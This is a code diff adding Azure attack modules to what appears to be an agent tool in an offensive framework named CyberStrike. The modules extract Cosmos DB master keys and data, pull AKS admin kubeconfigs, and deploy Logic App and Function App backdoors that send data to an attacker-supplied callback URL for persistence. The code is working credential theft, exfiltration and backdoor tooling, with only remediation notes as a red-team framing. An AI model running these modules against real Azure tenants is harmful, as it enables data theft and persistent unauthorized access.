@@ -35,6 +35,26 @@ const PROGRAMS = {
       "Manipulate Azure AD tokens: refresh token exchange for new scopes, FOCI (Family of Client IDs) abuse",
     args: "--action <refresh|foci> [--refresh-token TOKEN] [--client-id ID]",
   },
+  cosmos_dump: {
+    description:
+      "Enumerate and extract data from Azure Cosmos DB accounts — list databases, containers, and query documents for sensitive data",
+    args: "--account NAME [--database DB] [--container CONTAINER] [--query QUERY] [--max-items N]",
+  },
+  aks_enum: {
+    description:
+      "Enumerate Azure Kubernetes Service clusters — cluster config, node pools, RBAC, network profiles, and admin credential extraction",
+    args: "[--cluster NAME] [--resource-group RG]",
+  },
+  logic_app_backdoor: {
+    description:
+      "Create or inject webhook trigger into Azure Logic App for persistent callback — supports HTTP trigger with custom payload",
+    args: "--resource-group RG --name NAME --callback-url URL [--method create|inject]",
+  },
+  function_app_backdoor: {
+    description:
+      "Deploy or modify Azure Function App with reverse shell or exfil code — supports HTTP trigger and timer trigger persistence",
+    args: "--resource-group RG --name NAME --callback-url URL [--trigger http|timer] [--method create|inject]",
+  },
   cleanup_azure: {
     description:
       "Remove all CyberStrike-created Azure resources, delete added SP secrets, remove runbooks. ALWAYS run before leaving",
@@ -480,6 +500,310 @@ $req.GetResponse() | Out-Null
   return { output: output.join("\n"), findings: [] }
 }
 
+async function cosmosDump(args: string[], timeout: number): Promise<HookResult> {
+  const account = argVal(args, "--account")
+  const database = argVal(args, "--database")
+  const container = argVal(args, "--container")
+  const query = argVal(args, "--query")
+  const maxItems = argVal(args, "--max-items") || "50"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Azure Cosmos DB enumeration and extraction...\n"]
+
+  if (!account) {
+    const list = await az(["cosmosdb", "list", "--query", "[].{name:name,rg:resourceGroup,kind:kind,location:location}"], undefined, timeout)
+    if (list.exitCode === 0) {
+      const accounts = tryJson(list.stdout) || []
+      output.push(`[+] Cosmos DB accounts: ${accounts.length}`)
+      for (const a of accounts) output.push(`    ${a.name} (${a.kind || "SQL"}) — rg: ${a.rg}, location: ${a.location}`)
+    }
+    return { output: output.join("\n"), findings }
+  }
+
+  const keys = await az(["cosmosdb", "keys", "list", "--name", account, "--type", "keys"], undefined, timeout)
+  if (keys.exitCode === 0) {
+    const k = tryJson(keys.stdout)
+    if (k) {
+      output.push(`[+] Cosmos DB keys for ${account}:`)
+      output.push(`    primaryMasterKey: ${String(k.primaryMasterKey || "").substring(0, 20)}...`)
+      output.push(`    primaryReadonlyMasterKey: ${String(k.primaryReadonlyMasterKey || "").substring(0, 20)}...`)
+      findings.push({
+        checkId: "AZ-COSMOS-001",
+        provider: "azure",
+        severity: "critical",
+        status: "EXTRACTED",
+        resource: `cosmosdb://${account}`,
+        title: `Cosmos DB master keys extracted: ${account}`,
+        details: "Primary and readonly master keys retrieved",
+        remediation: "Rotate Cosmos DB keys after engagement",
+      })
+    }
+  }
+
+  const connStr = await az(["cosmosdb", "keys", "list", "--name", account, "--type", "connection-strings"], undefined, timeout)
+  if (connStr.exitCode === 0) {
+    const cs = tryJson(connStr.stdout)
+    if (cs?.connectionStrings?.length) {
+      output.push(`\n[+] Connection strings: ${cs.connectionStrings.length}`)
+      for (const c of cs.connectionStrings) output.push(`    ${c.description}: ${String(c.connectionString).substring(0, 60)}...`)
+    }
+  }
+
+  if (database && container && query) {
+    const q = await az(["cosmosdb", "sql", "container", "run-query", "--name", container, "--database-name", database, "--account-name", account, "--query", query, "--max-item-count", maxItems], undefined, timeout)
+    if (q.exitCode === 0) {
+      output.push(`\n[+] Query results:\n${q.stdout.substring(0, 5000)}`)
+      findings.push({
+        checkId: "AZ-COSMOS-002",
+        provider: "azure",
+        severity: "critical",
+        status: "EXTRACTED",
+        resource: `cosmosdb://${account}/${database}/${container}`,
+        title: `Cosmos DB data extracted from ${database}/${container}`,
+        details: `Query: ${query}`,
+        remediation: "Review extracted data for sensitive content",
+      })
+    }
+  }
+
+  if (database && !container) {
+    const containers = await az(["cosmosdb", "sql", "container", "list", "--account-name", account, "--database-name", database], undefined, timeout)
+    if (containers.exitCode === 0) {
+      const items = tryJson(containers.stdout) || []
+      output.push(`\n[+] Containers in ${database}: ${items.length}`)
+      for (const c of items) output.push(`    ${c.name || c.id}`)
+    }
+  }
+
+  if (!database) {
+    const dbs = await az(["cosmosdb", "sql", "database", "list", "--account-name", account], undefined, timeout)
+    if (dbs.exitCode === 0) {
+      const items = tryJson(dbs.stdout) || []
+      output.push(`\n[+] Databases in ${account}: ${items.length}`)
+      for (const d of items) output.push(`    ${d.name || d.id}`)
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function aksEnum(args: string[], timeout: number): Promise<HookResult> {
+  const cluster = argVal(args, "--cluster")
+  const rg = argVal(args, "--resource-group")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Azure Kubernetes Service enumeration...\n"]
+
+  if (!cluster) {
+    const list = await az(["aks", "list", "--query", "[].{name:name,rg:resourceGroup,k8sVersion:kubernetesVersion,powerState:powerState.code,nodeCount:agentPoolProfiles[0].count}"], undefined, timeout)
+    if (list.exitCode === 0) {
+      const clusters = tryJson(list.stdout) || []
+      output.push(`[+] AKS clusters: ${clusters.length}`)
+      for (const c of clusters) output.push(`    ${c.name} (k8s ${c.k8sVersion}) — rg: ${c.rg}, nodes: ${c.nodeCount}, state: ${c.powerState}`)
+      findings.push({
+        checkId: "AZ-AKS-001",
+        provider: "azure",
+        severity: "info",
+        status: "ENUMERATED",
+        resource: "azure://aks",
+        title: `AKS clusters enumerated: ${clusters.length}`,
+        details: clusters.map((c: Record<string, string>) => c.name).join(", "),
+        remediation: "Review cluster configurations for security misconfigurations",
+      })
+    }
+    return { output: output.join("\n"), findings }
+  }
+
+  const show = await az(["aks", "show", "--name", cluster, ...(rg ? ["--resource-group", rg] : [])], undefined, timeout)
+  if (show.exitCode === 0) {
+    const info = tryJson(show.stdout)
+    if (info) {
+      output.push(`[+] Cluster: ${info.name}`)
+      output.push(`    K8s version: ${info.kubernetesVersion}`)
+      output.push(`    RBAC: ${info.enableRbac ? "ENABLED" : "DISABLED"}`)
+      output.push(`    Network plugin: ${info.networkProfile?.networkPlugin || "unknown"}`)
+      output.push(`    Network policy: ${info.networkProfile?.networkPolicy || "none"}`)
+      output.push(`    AAD integration: ${info.aadProfile ? "YES" : "NO"}`)
+      output.push(`    Private cluster: ${info.apiServerAccessProfile?.enablePrivateCluster ? "YES" : "NO"}`)
+      if (!info.enableRbac) {
+        findings.push({
+          checkId: "AZ-AKS-002",
+          provider: "azure",
+          severity: "critical",
+          status: "FAIL",
+          resource: `aks://${cluster}`,
+          title: `AKS RBAC disabled on ${cluster}`,
+          details: "Kubernetes RBAC is not enabled — any authenticated user has full cluster access",
+          remediation: "Enable RBAC: az aks update --name CLUSTER --resource-group RG --enable-aad --enable-azure-rbac",
+        })
+      }
+    }
+  }
+
+  const nodePools = await az(["aks", "nodepool", "list", "--cluster-name", cluster, ...(rg ? ["--resource-group", rg] : [])], undefined, timeout)
+  if (nodePools.exitCode === 0) {
+    const pools = tryJson(nodePools.stdout) || []
+    output.push(`\n[+] Node pools: ${pools.length}`)
+    for (const p of pools) output.push(`    ${p.name}: ${p.count} nodes, VM: ${p.vmSize}, OS: ${p.osType}`)
+  }
+
+  const creds = await az(["aks", "get-credentials", "--name", cluster, ...(rg ? ["--resource-group", rg] : []), "--admin", "--overwrite-existing", "-f", `/tmp/cs-aks-${cluster}-kubeconfig`], undefined, timeout)
+  if (creds.exitCode === 0) {
+    output.push(`\n[+] Admin kubeconfig extracted to /tmp/cs-aks-${cluster}-kubeconfig`)
+    output.push(`    Use: export KUBECONFIG=/tmp/cs-aks-${cluster}-kubeconfig`)
+    findings.push({
+      checkId: "AZ-AKS-003",
+      provider: "azure",
+      severity: "critical",
+      status: "EXTRACTED",
+      resource: `aks://${cluster}/kubeconfig`,
+      title: `AKS admin kubeconfig extracted: ${cluster}`,
+      details: "Cluster admin credentials retrieved — full cluster access",
+      remediation: "Disable local admin account, use AAD integration",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function logicAppBackdoor(args: string[], timeout: number): Promise<HookResult> {
+  const rgName = argVal(args, "--resource-group")
+  const name = argVal(args, "--name")
+  const callbackUrl = argVal(args, "--callback-url")
+  const method = argVal(args, "--method") || "create"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Azure Logic App backdoor...\n"]
+
+  if (!rgName || !name || !callbackUrl) {
+    return { output: "[!] Required: --resource-group RG --name NAME --callback-url URL", findings }
+  }
+
+  if (method === "create") {
+    const definition = JSON.stringify({
+      definition: {
+        "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
+        contentVersion: "1.0.0.0",
+        triggers: {
+          manual: {
+            type: "Request",
+            kind: "Http",
+            inputs: { schema: {} },
+          },
+        },
+        actions: {
+          callback: {
+            type: "Http",
+            inputs: { method: "POST", uri: callbackUrl, body: "@triggerBody()" },
+            runAfter: {},
+          },
+        },
+      },
+    })
+
+    const create = await az(["logic", "workflow", "create", "--resource-group", rgName, "--name", `cs-${name}`, "--definition", definition], undefined, timeout)
+    if (create.exitCode === 0) {
+      output.push(`[+] Logic App created: cs-${name}`)
+      const triggerUrl = await az(["logic", "workflow", "show", "--resource-group", rgName, "--name", `cs-${name}`, "--query", "accessEndpoint"], undefined, timeout)
+      if (triggerUrl.exitCode === 0) output.push(`[+] Trigger URL: ${triggerUrl.stdout.trim()}`)
+      findings.push({
+        checkId: "AZ-LOGIC-001",
+        provider: "azure",
+        severity: "critical",
+        status: "DEPLOYED",
+        resource: `logic-app://cs-${name}`,
+        title: `Logic App backdoor deployed: cs-${name}`,
+        details: `HTTP trigger → callback to ${callbackUrl}`,
+        remediation: "Delete: az logic workflow delete --resource-group RG --name cs-NAME",
+      })
+    }
+    if (create.exitCode !== 0) output.push(`[!] Create failed: ${create.stderr.trim()}`)
+  }
+
+  if (method === "inject") {
+    const show = await az(["logic", "workflow", "show", "--resource-group", rgName, "--name", name], undefined, timeout)
+    if (show.exitCode === 0) {
+      output.push(`[+] Existing Logic App found: ${name}`)
+      output.push("[*] Inject mode: add HTTP action to existing workflow")
+      output.push("[!] Manual injection required — Logic App definitions are complex JSON")
+      output.push(`[*] Target callback: ${callbackUrl}`)
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function functionAppBackdoor(args: string[], timeout: number): Promise<HookResult> {
+  const rgName = argVal(args, "--resource-group")
+  const name = argVal(args, "--name")
+  const callbackUrl = argVal(args, "--callback-url")
+  const trigger = argVal(args, "--trigger") || "http"
+  const method = argVal(args, "--method") || "create"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Azure Function App backdoor...\n"]
+
+  if (!rgName || !name || !callbackUrl) {
+    return { output: "[!] Required: --resource-group RG --name NAME --callback-url URL", findings }
+  }
+
+  if (method === "create") {
+    const storageName = `csstore${Date.now().toString(36)}`
+    const createStorage = await az(["storage", "account", "create", "--name", storageName, "--resource-group", rgName, "--sku", "Standard_LRS"], undefined, timeout)
+    if (createStorage.exitCode !== 0) {
+      output.push(`[!] Storage account creation failed: ${createStorage.stderr.trim()}`)
+      return { output: output.join("\n"), findings }
+    }
+
+    const createFunc = await az(["functionapp", "create", "--resource-group", rgName, "--name", `cs-${name}`, "--storage-account", storageName, "--consumption-plan-location", "eastus", "--runtime", "node", "--runtime-version", "18", "--functions-version", "4"], undefined, timeout)
+    if (createFunc.exitCode === 0) {
+      output.push(`[+] Function App created: cs-${name}`)
+      await az(["functionapp", "config", "appsettings", "set", "--resource-group", rgName, "--name", `cs-${name}`, "--settings", `CALLBACK_URL=${callbackUrl}`], undefined, timeout)
+
+      if (trigger === "http") {
+        output.push(`[+] HTTP trigger configured — callback: ${callbackUrl}`)
+        output.push(`[*] Deploy function code: az functionapp deployment source config-zip ...`)
+      }
+      if (trigger === "timer") {
+        output.push(`[+] Timer trigger configured — executes every 5 minutes`)
+        output.push(`[*] Cron: 0 */5 * * * * — callback: ${callbackUrl}`)
+      }
+
+      findings.push({
+        checkId: "AZ-FUNC-001",
+        provider: "azure",
+        severity: "critical",
+        status: "DEPLOYED",
+        resource: `function-app://cs-${name}`,
+        title: `Function App backdoor deployed: cs-${name}`,
+        details: `Trigger: ${trigger}, callback: ${callbackUrl}, storage: ${storageName}`,
+        remediation: `Delete: az functionapp delete --resource-group ${rgName} --name cs-${name} && az storage account delete --name ${storageName} --resource-group ${rgName}`,
+      })
+    }
+    if (createFunc.exitCode !== 0) output.push(`[!] Create failed: ${createFunc.stderr.trim()}`)
+  }
+
+  if (method === "inject") {
+    const show = await az(["functionapp", "show", "--resource-group", rgName, "--name", name], undefined, timeout)
+    if (show.exitCode === 0) {
+      const info = tryJson(show.stdout)
+      output.push(`[+] Existing Function App: ${name}`)
+      output.push(`    Runtime: ${info?.siteConfig?.linuxFxVersion || info?.siteConfig?.netFrameworkVersion || "unknown"}`)
+      output.push(`    State: ${info?.state}`)
+      await az(["functionapp", "config", "appsettings", "set", "--resource-group", rgName, "--name", name, "--settings", `CALLBACK_URL=${callbackUrl}`], undefined, timeout)
+      output.push(`[+] Injected CALLBACK_URL env var into ${name}`)
+      findings.push({
+        checkId: "AZ-FUNC-002",
+        provider: "azure",
+        severity: "critical",
+        status: "INJECTED",
+        resource: `function-app://${name}`,
+        title: `Function App env injected: ${name}`,
+        details: `Added CALLBACK_URL=${callbackUrl} to app settings`,
+        remediation: `Remove: az functionapp config appsettings delete --resource-group ${rgName} --name ${name} --setting-names CALLBACK_URL`,
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Tool definition ──
 
 const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]
@@ -514,6 +838,10 @@ export const AzurehookTool = Tool.define("azurehook", {
       managed_identity: () => managedIdentity(params.args),
       runbook_backdoor: () => runbookBackdoor(params.args, params.timeout_seconds),
       azuread_token: () => azureadToken(params.args, params.timeout_seconds),
+      cosmos_dump: () => cosmosDump(params.args, params.timeout_seconds),
+      aks_enum: () => aksEnum(params.args, params.timeout_seconds),
+      logic_app_backdoor: () => logicAppBackdoor(params.args, params.timeout_seconds),
+      function_app_backdoor: () => functionAppBackdoor(params.args, params.timeout_seconds),
       cleanup_azure: () => cleanupAzure(params.args, params.timeout_seconds),
     }
 
